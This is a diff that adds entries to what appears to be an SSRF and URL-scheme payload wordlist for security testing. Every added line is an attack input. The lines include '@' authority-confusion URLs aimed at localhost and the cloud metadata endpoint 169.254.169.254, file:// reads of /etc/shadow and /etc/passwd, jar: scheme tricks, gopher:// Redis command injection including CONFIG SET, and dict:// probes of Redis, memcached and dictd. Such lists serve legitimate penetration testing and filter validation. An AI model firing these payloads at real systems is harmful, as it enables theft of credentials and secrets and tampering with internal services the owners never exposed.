@@ -150,3 +150,25 @@ javascript:alert(1)
 # Wrapper combinations
 zip://archive.zip#file.txt
 rar://archive.rar#file.txt
+
+# Userinfo (@) authority-confusion bypasses (from SSRFPwned)
+http://expected-domain.com@127.0.0.1/
+http://expected-domain.com@169.254.169.254/
+http://127.0.0.1#@expected-domain.com/
+http://expected-domain.com%2f@127.0.0.1/
+
+# Additional file targets
+file:///etc/shadow
+file://\/\/etc/passwd
+
+# jar scheme variants
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
+
+# Redis / memcached / dict command injection via SSRF
+gopher://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:6379/_CONFIG%20GET%20%2A
+gopher://127.0.0.1:6379/_%0d%0aCONFIG%20SET%20dir%20%2Ftmp%0d%0a
+dict://127.0.0.1:6379/INFO
+dict://127.0.0.1:11211/stats
+dict://127.0.0.1:2628/ls
